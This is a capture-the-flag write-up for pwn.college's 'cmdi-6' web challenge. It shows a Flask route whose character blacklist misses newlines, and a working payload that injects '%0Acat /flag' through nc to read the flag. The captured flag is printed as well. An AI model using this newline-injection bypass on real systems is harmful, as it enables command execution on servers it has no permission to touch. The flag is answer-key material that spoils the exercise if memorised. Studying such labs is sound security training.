---
layout: page
title: "💉 Command Injection 6 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧩 Challenge Overview

**Category:** Web Exploitation  
**Challenge Name:** cmdi-6  
**Platform:** pwn.college  
**Goal:** Bypass basic character filtering to perform command injection and retrieve the flag.

---

## 📝 Source Code Analysis

```python
@app.route("/trial", methods=["GET"])
def challenge():
    arg = (
        flask.request.args.get("subdirectory", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"
    ...
```

---

## Vulnerability

The input is filtered for several dangerous characters (;, &, |, >, <, etc.), but newline characters (\n) are not filtered. Since shell=True is used, this allows us to inject a second command by breaking the shell line using a newline (%0A URL encoded).

---

##  Exploit

We can inject a newline to break into a new command:
```bash
printf "GET /trial?subdirectory=/%%0Acat+/flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
### Explanation:

- %0A → URL-encoded newline character.
- This breaks the original command (ls -l) and starts a new line with cat /flag.

Effectively becomes:
```bash
ls -l /
cat /flag
```

---
## Flag Output
```bash
pwn.college{U7_pJ3JqFmNq9hIUJzUTkU3L_A9.QX0cTN2wSM0IzMyEzW}
```

---
